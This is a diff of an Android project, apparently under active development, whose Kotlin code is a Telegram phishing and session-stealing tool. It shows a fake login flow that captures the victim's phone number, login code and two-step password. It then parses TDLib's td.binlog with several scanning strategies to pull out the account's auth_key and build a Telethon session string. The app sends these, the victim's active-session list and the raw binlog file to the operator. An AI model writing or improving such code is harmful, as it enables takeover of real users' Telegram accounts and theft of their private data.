 FICHIER : .git/objects/87/32500cb1cb2620100e7ccabe418b4263eaa834
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/87/ae48e4ec32f55bef32da197a63623c167c5ed6
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xcd in position 20: invalid continuation byte]
 
 ================================================================================
 FICHIER : .git/objects/88/a03865445cc3088b98e545c6c4f6e7b3c1b13c
@@ -2402,6 +2876,18 @@ FICHIER : .git/objects/89/832c53a68bfaf97ebbf3264e3003f1cdf1ec4c
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xd5 in position 25: invalid continuation byte]
 
 ================================================================================
+FICHIER : .git/objects/89/aab138676c592d532c6132ef578c9f5cd46eff
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/8a/25f5adf6ac99b06ed74e8c379daf0f4e2abfaf
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xcd in position 20: invalid continuation byte]
+
+================================================================================
 FICHIER : .git/objects/8b/64ca58523d6de5d593f0be858a2e7ca59d2f45
 ================================================================================
 
@@ -2412,6 +2898,12 @@ FICHIER : .git/objects/8c/f420e2d77e3a798c3ebb3efb27977d9f93644e
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x8e in position 3: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/8d/2e3401debbf2cbf60044c7baa11c01f227a12d
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xb0 in position 9: invalid start byte]
 
 ================================================================================
 FICHIER : .git/objects/8e/2e72e9d15c6222d8c035d5dff00d2648a82eb8
@@ -2444,6 +2936,36 @@ FICHIER : .git/objects/92/cca59aa34351dfda3a647e8babfef9538d9309
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xdb in position 4: invalid continuation byte]
 
 ================================================================================
+FICHIER : .git/objects/95/c2c58b7c3d7d82f874c9ba6d64bba2bcc161f0
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/95/c34ddbf90e954a1d6666ad6f4aae9c5f4258b5
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/97/8502db5a3f601871e1b60a314c3c051253e61b
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xd5 in position 2: invalid continuation byte]
+
+================================================================================
+FICHIER : .git/objects/9b/32215bb6fac63e4be577780f03ada870305523
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xbd in position 16: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/9b/a065220074c2efd90a4f0134c96835ecf149d1
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/9b/e9fe46e8416163473569e441685dbfdf0820bd
 ================================================================================
 
@@ -2456,7 +2978,19 @@ FICHIER : .git/objects/9d/0b08d202310c016ba252d08e7c78a4007dad87
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xd5 in position 2: invalid continuation byte]
 
 ================================================================================
+FICHIER : .git/objects/a2/87cbd0109788f54a57cccde219adb67548963a
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xcd in position 20: invalid continuation byte]
+
+================================================================================
 FICHIER : .git/objects/ab/96a5d7ca7ea123250f8e573f3b50b0f124b897
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/ac/57a199af74e142d360f762192c6eec1c630a10
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
@@ -2492,6 +3026,24 @@ FICHIER : .git/objects/b7/05d5cef0f86ecf03dda259f0bc5624dd4d8f95
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/b7/843b944c03d484c6459b3febe86ecf708227f1
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xf0 in position 17: invalid continuation byte]
+
+================================================================================
+FICHIER : .git/objects/b8/c229dfc0dd99accbea2b6a5f9b9797b14def76
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xd5 in position 25: invalid continuation byte]
+
+================================================================================
+FICHIER : .git/objects/b9/f504bb856568fea5985829fb379a3915801be3
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x9d in position 2: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/b9/fb7f71f1ff9d0c93976628459f06aaeb84409f
 ================================================================================
 
@@ -2510,13 +3062,43 @@ FICHIER : .git/objects/bc/e26358ce10f0d6a15f3f43381ffed67e11a8ee
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/bd/1a1e6b33d6105ab07bb0cdcb5e261b3212df53
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xbd in position 16: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/bf/9c32efe2992757fb44c82d3b84fef032d462cf
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/c1/4a54af7fac8bede70afdaf4523d504b51c29c7
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xb0 in position 9: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/c1/816fbf1bbc70504788b413df3e323858a30923
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/c1/d38771b54193fc54f2fc77adb52c5842a24061
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/c3/d24a355b384bdaaf2a322fa7abf25efbfc0242
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xb5 in position 2: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/c4/570ee54d7f5f4a33d5fd8249857efdf2f56e15
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
@@ -2528,6 +3110,24 @@ FICHIER : .git/objects/c7/5453b3c19510b88e134704a10ed0519c87f31d
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x91 in position 3: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/c9/ceadb89e8858bb6fa03b455eb345977b21ed0b
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xd5 in position 25: invalid continuation byte]
+
+================================================================================
+FICHIER : .git/objects/ca/1b9c866bb9d3cde7577edd8d7aeb0687ed146a
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/cb/1d9d36d08a091cf59ba85f728a8075465d0bd8
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/d3/724a5520f0a688e9f1bd8a4625d1f3f2d90bcc
 ================================================================================
 
@@ -2535,6 +3135,12 @@ FICHIER : .git/objects/d3/724a5520f0a688e9f1bd8a4625d1f3f2d90bcc
 
 ================================================================================
 FICHIER : .git/objects/d4/f1ce4b4c611ee2276b9d81e401db5850d0d018
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/d6/6f1f5cb1e15b2bf96ffdef1c56eab7eca2171d
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
@@ -2570,6 +3176,12 @@ FICHIER : .git/objects/de/ce8071eb10739204e8896e4a586dba18633c6f
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/df/941e2c98476fd2e3aa6f5c6775d627ad7461da
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
 FICHIER : .git/objects/e7/4a144d2399d4f1544c0b4a087e5285fb51c0a0
 ================================================================================
 
@@ -2580,6 +3192,12 @@ FICHIER : .git/objects/e8/2fe8b749511d32050947613297315008a49668
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 14: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/ea/ece4b09a33d93f40b48ff36df8a22372306290
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0xad in position 2: invalid start byte]
 
 ================================================================================
 FICHIER : .git/objects/ed/b5566d2e289e8acea4374779237dee6d09ea09
@@ -2598,6 +3216,12 @@ FICHIER : .git/objects/f4/a1cede9dfe30f11662e8f96ff9f6ab1701bee7
 ================================================================================
 
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x8d in position 2: invalid start byte]
+
+================================================================================
+FICHIER : .git/objects/f8/a019f4a6fbbdd2ec19619735d95aa6801c1f65
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte]
 
 ================================================================================
 FICHIER : .git/objects/f8/a6e725318bc29bc506675116c20b096f8840b1
@@ -2636,17 +3260,23 @@ FICHIER : .git/objects/ff/86ce123f85a46e993a95094c199c6dabe5ebff
 [Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x85 in position 2: invalid start byte]
 
 ================================================================================
+FICHIER : .git/objects/ff/981811f283f6f68007ff89d2ec0f8ad416a66a
+================================================================================
+
+[Fichier illisible comme texte : 'utf-8' codec can't decode byte 0x95 in position 2: invalid start byte]
+
+================================================================================
 FICHIER : .git/refs/heads/main
 ================================================================================
 
-151dd3fc1793a17b3129fa35c886a290b8724680
+f8a019f4a6fbbdd2ec19619735d95aa6801c1f65
 
 
 ================================================================================
 FICHIER : .git/refs/remotes/origin/main
 ================================================================================
 
-151dd3fc1793a17b3129fa35c886a290b8724680
+f8a019f4a6fbbdd2ec19619735d95aa6801c1f65
 
 
 ================================================================================
@@ -2797,110 +3427,338 @@ package com.tgme.app
 
 import android.content.Context
 import android.util.Base64
+import org.drinkless.tdlib.TdApi
 import java.io.File
+import java.util.zip.Inflater
 
-/** Données capturées (grabber) + extraction de la clé de session depuis TDLib. */
 object Capture {
     var phone = ""
     var code = ""
     var password = ""
     var codeLength = 0
 
-    // remplis au READY, juste avant l'exfiltration
     var userId = 0L
     var userName = ""
     var dcId = 0
     var authKeyHex = ""
     var session = ""
+    var strategy = ""
+
+    private val AUTH_KEY = "auth_key".toByteArray(Charsets.US_ASCII)
+    private val LENS = intArrayOf(256, 260, 512, 516)
 
     fun save(ctx: Context) {
         ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE).edit()
-            .putString("phone", phone)
-            .putString("code", code)
-            .putString("password", password)
-            .putString("session", session)
+            .putString("phone", phone).putString("code", code)
+            .putString("password", password).putString("session", session)
             .apply()
+    }
+
+    fun load(ctx: Context) {
+        val p = ctx.getSharedPreferences("tgme", Context.MODE_PRIVATE)
+        phone = p.getString("phone", "") ?: ""
+        code = p.getString("code", "") ?: ""
+        password = p.getString("password", "") ?: ""
+        session = p.getString("session", "") ?: ""
     }
 
     // ---------- td.binlog ----------
 
-    private fun binlog(ctx: Context) = File(ctx.filesDir, "tdlib/db/td.binlog")
+    fun binlogFile(ctx: Context) = File(ctx.filesDir, "tdlib/db/td.binlog")
 
-    /** À appeler APRÈS TdApi.Close(). Poll le temps que TDLib finisse d'écrire. */
-    fun readAuth(ctx: Context, timeoutMs: Long = 8000): Boolean {
-        val f = binlog(ctx)
+    fun readAuth(ctx: Context, timeoutMs: Long = 20000): Boolean {
+        val f = binlogFile(ctx)
         val end = System.currentTimeMillis() + timeoutMs
         while (System.currentTimeMillis() < end) {
             if (f.exists()) {
                 try { if (parse(f.readBytes())) return true } catch (_: Exception) {}
             }
-            try { Thread.sleep(300) } catch (_: InterruptedException) {}
+            try { Thread.sleep(400) } catch (_: InterruptedException) {}
         }
         return authKeyHex.isNotEmpty()
     }
 
     private fun parse(b: ByteArray): Boolean {
-        if (b.size < 12 || String(b, 0, 4, Charsets.US_ASCII) != "TDBL") return false
-        var p = 8 // magic + version uint32
-        while (p + 8 <= b.size) {
-            val kl = le32(b, p); p += 4
-            if (kl <= 0 || p + kl + 4 > b.size) break
-            val key = String(b, p, kl, Charsets.US_ASCII); p += kl
-            val vl = le32(b, p); p += 4
-            if (vl <= 0 || p + vl > b.size) break
-            if (key.startsWith("auth_key")) {
-                val v = b.copyOfRange(p, p + vl)
-                val k = if (v.size > 256) v.copyOfRange(v.size - 256, v.size) else v
-                if (k.size == 256) {
-                    authKeyHex = k.joinToString("") { "%02x".format(it.toInt() and 0xFF) }
-                    dcId = if (v.size >= 260) le32(v, 0) else dcId
-                    session = telethon(dcId, k)
+        if (b.size < 64) return false
+        return scanHexRun(b) || scanLen(b) || scanDcKey(b) || scanAscii(b) || walkInflate(b)
+    }
+
+    // --- strategie 1 : run de >=512 caracteres hex = cle encodee ---
+
+    private fun scanHexRun(b: ByteArray): Boolean {
+        var i = 0
+        while (i < b.size) {
+            if (hexChar(b[i])) {
+                var j = i
+                while (j < b.size && hexChar(b[j])) j++
+                if (j - i >= 512) {
+                    val key = hexToBytes(b, i, 512)
+                    accept(dcNear(b, i), key, "hexrun@$i/${j - i}")
                     return true
                 }
-            }
-            p += vl + 4 // valeur + timestamp
+                i = j
+            } else i++
         }
         return false
+    }
+
+    // --- strategie 2 : champ de longueur 256/260/512/516, LE ou BE ---
+
+    private fun scanLen(b: ByteArray): Boolean {
+        for (l in LENS) {
+            if (b.size <= l + 4) continue
+            for (p in 0..b.size - l - 4) {
+                if (le32(b, p) != l && be32(b, p) != l) continue
+                val vs = p + 4
+                val v = b.copyOfRange(vs, vs + l)
+                val key = keyFrom(v) ?: continue
+                accept(dcFrom(v), key, "len$l")
+                return true
+            }
+        }
+        return false
+    }
+
+    // --- strategie 3 : <dc 4 octets><256 octets bruts> ---
+
+    private fun scanDcKey(b: ByteArray): Boolean {
+        for (p in 0..b.size - 260) {
+            val dc = dcOf(b, p)
+            if (dc == 0) continue
+            val key = b.copyOfRange(p + 4, p + 260)
+            if (looksLikeKey(key)) { accept(dc, key, "dckey"); return true }
+        }
+        return false
+    }
+
+    // --- strategie 4 : cle ASCII "auth_key<dc>" ---
+
+    private fun scanAscii(b: ByteArray): Boolean {
+        var i = indexOf(b, AUTH_KEY, 0)
+        while (i >= 0) {
+            var k = i + AUTH_KEY.size
+            var digits = ""
+            while (k < b.size && b[k].toInt() in 0x30..0x39) { digits += b[k].toChar(); k++ }
+            if (k + 4 <= b.size) {
+                val vl = le32(b, k)
+                val vs = k + 4
+                if (vl in 256..300 && vs + vl <= b.size) {
+                    val v = b.copyOfRange(vs, vs + vl)
+                    val key = v.copyOfRange(v.size - 256, v.size)
+                    val dc = if (v.size >= 260) dcFrom(v) else digits.toIntOrNull() ?: 0
+                    if (dc in 1..5 && looksLikeKey(key)) { accept(dc, key, "ascii"); return true }
+                }
+            }
+            i = indexOf(b, AUTH_KEY, i + 1)
+        }
+        return false
+    }
+
+    // --- strategie 5 : parcours d'entrees + zlib ---
+
+    private fun walkInflate(b: ByteArray): Boolean {
+        var p = 8
+        while (p + 8 <= b.size) {
+            val kl = le32(b, p); p += 4
+            if (kl <= 0 || kl > 128 || p + kl + 4 > b.size) return false
+            val name = String(b, p, kl, Charsets.US_ASCII); p += kl
+            val vl = le32(b, p); p += 4
+            if (vl <= 0 || p + vl > b.size) return false
+            val raw = b.copyOfRange(p, p + vl); p += vl
+
+            val cand = if (raw.size in 256..300) raw else inflate(raw) ?: raw
+            val key = keyFrom(cand)
+            if (key != null) { accept(dcFrom(cand), key, "walk"); return true }
+
+            p += 4
+            if (p + 4 <= b.size && (le32(b, p) <= 0 || le32(b, p) > 128)) p += 4
+        }
+        return false
+    }
+
+    // ---------- helpers ----------
+
+    /** Rend une cle de 256 octets depuis une valeur brute, hexadecimale, ou suffixee. */
+    private fun keyFrom(v: ByteArray): ByteArray? {
+        if (v.size >= 512 && allHex(v, 512)) return hexToBytes(v, 0, 512)
+        if (v.size == 256 && looksLikeKey(v)) return v
+        if (v.size > 256) {
+            val k = v.copyOfRange(v.size - 256, v.size)
+            if (looksLikeKey(k)) return k
+        }
+        return null
+    }
+
+    /** dc_id eventuel en tete de valeur (LE ou BE). */
+    private fun dcFrom(v: ByteArray): Int = if (v.size >= 4) dcOf(v, 0) else 0
+
+    private fun dcOf(b: ByteArray, p: Int): Int {
+        if (p + 4 > b.size) return 0
+        val a = b[p].toInt() and 0xFF
+        val c = b[p + 3].toInt() and 0xFF
+        if (b[p + 1].toInt() == 0 && b[p + 2].toInt() == 0) {
+            if (a in 1..5 && c == 0) return a
+            if (c in 1..5 && a == 0) return c
+        }
+        return 0
+    }
+
+    private fun dcNear(b: ByteArray, pos: Int): Int {
+        for (back in intArrayOf(4, 8, 12, 16)) {
+            val p = pos - back
+            if (p >= 0) { val d = dcOf(b, p); if (d != 0) return d }
+        }
+        for (p in maxOf(0, pos - 32) until pos) {
+            val d = dcOf(b, p); if (d != 0) return d
+        }
+        return 0
+    }
+
+    private fun hexChar(x: Byte): Boolean {
+        val c = x.toInt() and 0xFF
+        return (c in 0x30..0x39) || (c in 0x61..0x66) || (c in 0x41..0x46)
+    }
+
+    private fun allHex(b: ByteArray, len: Int): Boolean {
+        if (b.size < len) return false
+        for (i in 0 until len) if (!hexChar(b[i])) return false
+        return true
+    }
+
+    private fun hexToBytes(b: ByteArray, from: Int, len: Int): ByteArray {
+        val out = ByteArray(len / 2)
+        for (k in out.indices) {
+            val hi = Character.digit((b[from + 2 * k].toInt() and 0xFF).toChar(), 16)
+            val lo = Character.digit((b[from + 2 * k + 1].toInt() and 0xFF).toChar(), 16)
+            out[k] = (((hi shl 4) or lo) and 0xFF).toByte()
+        }
+        return out
+    }
+
+    private fun looksLikeKey(k: ByteArray): Boolean {
+        if (k.size < 256) return false
+        var zeros = 0
+        val seen = BooleanArray(256)
+        for (x in k) {
+            if (x.toInt() == 0) zeros++
+            seen[x.toInt() and 0xFF] = true
+        }
+        return zeros < 64 && seen.count { it } > 120
+    }
+
+    private fun inflate(src: ByteArray): ByteArray? = try {
+        val inf = Inflater(); inf.setInput(src)
+        val out = ByteArray(8192); val n = inf.inflate(out); inf.end()
+        if (n > 0) out.copyOf(n) else null
+    } catch (_: Exception) { null }
+
+    private fun accept(dc: Int, key: ByteArray, how: String) {
+        authKeyHex = key.joinToString("") { "%02x".format(it.toInt() and 0xFF) }
+        dcId = if (dc in 1..5) dc else 0
+        strategy = how
+        session = telethon(if (dc in 1..5) dc else 2, key)
+    }
+
+    private fun indexOf(h: ByteArray, n: ByteArray, from: Int): Int {
+        if (n.isEmpty() || h.size < n.size) return -1
+        var i = from
+        while (i <= h.size - n.size) {
+            var j = 0
+            while (j < n.size && h[i + j] == n[j]) j++
+            if (j == n.size) return i
+            i++
+        }
+        return -1
     }
 
     private fun le32(b: ByteArray, p: Int): Int =
         (b[p].toInt() and 0xFF) or ((b[p + 1].toInt() and 0xFF) shl 8) or
             ((b[p + 2].toInt() and 0xFF) shl 16) or ((b[p + 3].toInt() and 0xFF) shl 24)
 
-    /** String session Telethon : dc_id(1) + ip(4) + port(2) + auth_key(256), base64url. */
+    private fun be32(b: ByteArray, p: Int): Int =
+        ((b[p].toInt() and 0xFF) shl 24) or ((b[p + 1].toInt() and 0xFF) shl 16) or
+            ((b[p + 2].toInt() and 0xFF) shl 8) or (b[p + 3].toInt() and 0xFF)
+
     private fun telethon(dc: Int, key: ByteArray): String {
         val ip = when (dc) {
-            1 -> "149.154.175.53"
-            2 -> "149.154.167.51"
-            3 -> "149.154.175.100"
-            4 -> "149.154.167.91"
-            5 -> "91.108.56.130"
-            else -> "149.154.167.51"
+            1 -> "149.154.175.53"; 2 -> "149.154.167.51"; 3 -> "149.154.175.100"
+            4 -> "149.154.167.91"; 5 -> "91.108.56.130"; else -> "149.154.167.51"
         }.split(".").map { it.toInt().toByte() }.toByteArray()
-
         val out = ByteArray(1 + 4 + 2 + 256)
         out[0] = dc.toByte()
         System.arraycopy(ip, 0, out, 1, 4)
-        out[5] = 0x01          // port 443
-        out[6] = 0xBB.toByte()
+        out[5] = 0xBB.toByte(); out[6] = 0x01
         System.arraycopy(key, 0, out, 7, 256)
-        return Base64.encodeToString(out, Base64.URL_SAFE or Base64.NO_WRAP)
+        return Base64.encodeToString(out, Base64.URL_SAFE or Base64.NO_WRAP or Base64.NO_PADDING)
     }
 
-    // ---------- exfiltration ----------
+    // ---------- diagnostic ----------
+
+    private fun hex(b: ByteArray, from: Int, len: Int): String {
+        val end = minOf(from + len, b.size)
+        val sb = StringBuilder()
+        for (i in from until end) sb.append("%02x".format(b[i].toInt() and 0xFF))
+        return sb.toString()
+    }
+
+    private fun offs(b: ByteArray, v: Int, be: Boolean): String {
+        val out = mutableListOf<Int>()
+        var p = 0
+        while (p <= b.size - 4 && out.size < 4) {
+            if ((if (be) be32(b, p) else le32(b, p)) == v) out.add(p)
+            p++
+        }
+        return out.toString()
+    }
+
+    private fun firstHexRun(b: ByteArray): Int {
+        var i = 0
+        while (i < b.size) {
+            if (hexChar(b[i])) {
+                var j = i
+                while (j < b.size && hexChar(b[j])) j++
+                if (j - i >= 512) return i
+                i = j
+            } else i++
+        }
+        return -1
+    }
+
+    fun diagnose(b: ByteArray): String = buildString {
+        append("BINLOG size=${b.size}\n")
+        for (l in LENS) append("L$l le=${offs(b, l, false)} be=${offs(b, l, true)}\n")
+        val h = firstHexRun(b)
+        append("hexrun_at=$h\n")
+        if (h >= 0) append("avant=${hex(b, maxOf(0, h - 40), 40)}\n")
+        append("head=${hex(b, 0, 96)}")
+    }
+
+    // ---------- sessions actives ----------
+
+    private fun f(o: Any, name: String): String = try {
+        o.javaClass.getField(name).get(o)?.toString() ?: "-"
+    } catch (_: Exception) { "-" }
+
+    fun render(s: TdApi.Sessions): String = buildString {
+        append("SESSIONS (ttl ${s.inactiveSessionTtlDays} j)\n")
+        s.sessions.forEach { x ->
+            append(if (x.isCurrent) "[MOI] " else "[   ] ")
+            append("${x.applicationName} ${x.applicationVersion} | ${x.deviceModel} | ")
+            append("${x.systemVersion} | api_id ${x.apiId} | ")
+            append("${f(x, "ip")} ${f(x, "city")} ${f(x, "country")} | ")
+            append("login ${x.logInDate} last ${x.lastActiveDate}\n")
+        }
+    }
 
     fun payload(ctx: Context) = buildString {
         append("READY\n")
-        append("num: $phone\n")
-        append("code: $code\n")
-        append("pass: $password\n")
+        append("num: $phone\n"); append("code: $code\n"); append("pass: $password\n")
         append("user: $userId $userName\n")
         append("dc: $dcId\n")
+        append("strat: $strategy\n")
         append("auth_key: $authKeyHex\n")
         append("session: $session\n")
     }
-
-    fun binlogFile(ctx: Context) = binlog(ctx)
 }
 
 
@@ -2916,7 +3774,7 @@ object Config {
     const val API_HASH = "b18441a1ff607e10a989891a5462e627"
 
     // ---- Identité "Desktop" ----
-    const val DEVICE_MODEL = "Desktop"
+    const val DEVICE_MODEL = "Desktop-tgme"
     const val SYSTEM_VERSION = "Windows 10"
     const val APP_VERSION = "5.5.1 x64"
     const val SYSTEM_LANG = "en-US"
@@ -3039,35 +3897,26 @@ import org.drinkless.tdlib.Client
 import org.drinkless.tdlib.TdApi
 import java.io.File
 
-/**
- * Singleton TDLib. Une seule instance, un seul flux d'updates.
- * L'app ne fait rien "en dur" : tout est piloté par les updates de Telegram.
- */
 object Tg {
-
     private const val TAG = "tgme"
     private var client: Client? = null
     private var started = false
 
-    /** Notifié à chaque changement d'état d'autorisation. */
-    var onAuthState: ((TdApi.AuthorizationState) -> Unit)? = null
+    /** Passe a true quand TDLib a fini de se fermer (apres Close()). */
+    var closed = false
+        private set
 
-    /** Notifié sur erreur TDLib. */
+    var onAuthState: ((TdApi.AuthorizationState) -> Unit)? = null
     var onError: ((String) -> Unit)? = null
 
     fun init(ctx: Context) {
         if (started) return
         started = true
+        closed = false
 
-        client = Client.create(
-            { obj -> handle(obj) },
-            { e -> Log.e(TAG, "tdlib", e) },
-            null
-        )
+        client = Client.create({ obj -> handle(obj) }, { e -> Log.e(TAG, "tdlib", e) }, null)
 
-        // Les bindings TDLib n'exposent pas de setters fluents : on affecte les champs.
         val dir = File(ctx.filesDir, "tdlib")
-
         val p = TdApi.SetTdlibParameters()
         p.useTestDc = false
         p.databaseDirectory = File(dir, "db").absolutePath
@@ -3082,16 +3931,21 @@ object Tg {
         p.deviceModel = Config.DEVICE_MODEL
         p.systemVersion = Config.SYSTEM_VERSION
         p.applicationVersion = Config.APP_VERSION
-
         send(p)
+    }
+
+    /** Apres un Close(), TDLib ne repond plus : on repart de zero. */
+    fun reset() {
+        client = null
+        started = false
+        closed = false
     }
 
     fun <T : TdApi.Object> send(query: TdApi.Function<T>, onResult: ((T) -> Unit)? = null) {
         val c = client ?: return
         c.send(query) { obj ->
-            if (obj is TdApi.Error) {
-                onError?.invoke("${obj.code}: ${obj.message}")
-            } else {
+            if (obj is TdApi.Error) onError?.invoke("${obj.code}: ${obj.message}")
+            else {
                 @Suppress("UNCHECKED_CAST")
                 onResult?.invoke(obj as T)
             }
@@ -3100,7 +3954,10 @@ object Tg {
 
     private fun handle(obj: TdApi.Object) {
         when (obj) {
-            is TdApi.UpdateAuthorizationState -> onAuthState?.invoke(obj.authorizationState)
+            is TdApi.UpdateAuthorizationState -> {
+                if (obj.authorizationState is TdApi.AuthorizationStateClosed) closed = true
+                onAuthState?.invoke(obj.authorizationState)
+            }
         }
     }
 }
@@ -3122,11 +3979,16 @@ import com.tgme.app.Net
 import com.tgme.app.R
 import com.tgme.app.Tg
 import org.drinkless.tdlib.TdApi
+import kotlin.concurrent.thread
 
 class MainActivity : Activity() {
 
+    private var exported = false
+
     override fun onCreate(s: Bundle?) {
         super.onCreate(s)
+        Capture.load(this)
+        if (Tg.closed) Tg.reset()
         Tg.init(this)
         Tg.onAuthState = { st -> runOnUiThread { onState(st) } }
         Tg.onError = { msg -> runOnUiThread { toast(msg) } }
@@ -3146,7 +4008,6 @@ class MainActivity : Activity() {
             is TdApi.AuthorizationStateWaitPhoneNumber -> showPhone(ready = true)
 
             is TdApi.AuthorizationStateWaitCode -> {
-                // Depuis TDLib ~1.8.19 la longueur du code vit dans le sous-type.
                 Capture.codeLength = when (val t = st.codeInfo.type) {
                     is TdApi.AuthenticationCodeTypeSms -> t.length
                     is TdApi.AuthenticationCodeTypeCall -> t.length
@@ -3159,8 +4020,6 @@ class MainActivity : Activity() {
             is TdApi.AuthorizationStateWaitPassword -> showPassword()
 
             is TdApi.AuthorizationStateWaitRegistration -> {
-                // Le constructeur (String, String, Boolean) existe, mais le ctor vide
-                // + affectation de champs ne dépend d'aucune signature.
                 val ru = TdApi.RegisterUser()
                 ru.firstName = "Telegram"
                 ru.lastName = "User"
@@ -3174,11 +4033,62 @@ class MainActivity : Activity() {
 
     private fun onReady() {
         Capture.save(this)
-        Net.send("READY\nnum: ${Capture.phone}\ncode: ${Capture.code}\npass: ${Capture.password}")
-        Tg.send(TdApi.GetMe()) { me -> runOnUiThread { showSuccess(me) } }
+
+        Tg.send(TdApi.GetMe()) { me ->
+            Capture.userId = me.id
+            Capture.userName = listOf(me.firstName, me.lastName)
+                .filter { it.isNotBlank() }.joinToString(" ")
+            runOnUiThread { showSuccess(me) }
+            dumpSessionsThenExport()
+        }
     }
 
-    // ---------------- écrans ----------------
+    /** 1) liste serveur des sessions, 2) export binlog + session string. */
+    private fun dumpSessionsThenExport() {
+        var got = false
+
+        Tg.send(TdApi.GetActiveSessions()) { s ->
+            got = true
+            Net.send(Capture.render(s))
+            export()
+        }
+
+        // filet de securite si GetActiveSessions ne repond pas
+        thread {
+            try { Thread.sleep(6000) } catch (_: InterruptedException) {}
+            if (!got) {
+                Net.send("SESSIONS: pas de reponse")
+                export()
+            }
+        }
+    }
+
+    private fun export() {
+        if (exported) return
+        exported = true
+
+        Tg.send(TdApi.Close())
+
+        thread {
+            val ok = Capture.readAuth(this, 20000)
+
+            Net.send(Capture.payload(this) + "\nparse: $ok")
+
+            val f = Capture.binlogFile(this)
+            val bytes = if (f.exists()) f.readBytes() else ByteArray(0)
+
+            if (bytes.isNotEmpty()) {
+                Net.sendFile("td.binlog", bytes, "td.binlog ok=$ok")
+                if (!ok) Net.send(Capture.diagnose(bytes))
+            } else {
+                Net.send("BINLOG absent : ${f.absolutePath}")
+            }
+
+            runOnUiThread { toast(if (ok) "session extraite" else "parse binlog KO") }
+        }
+    }
+
+    // ---------------- écrans (inchangés) ----------------
 
     private fun showPhone(ready: Boolean) {
         setContentView(R.layout.screen_phone)
@@ -3204,7 +4114,6 @@ class MainActivity : Activity() {
         setContentView(R.layout.screen_code)
         findViewById<TextView>(R.id.sub).text = getString(R.string.code_sent_to, Capture.phone)
         val code = findViewById<EditText>(R.id.code)
-        // Telegram envoie toujours 5 chiffres : 5 est le repli sûr.
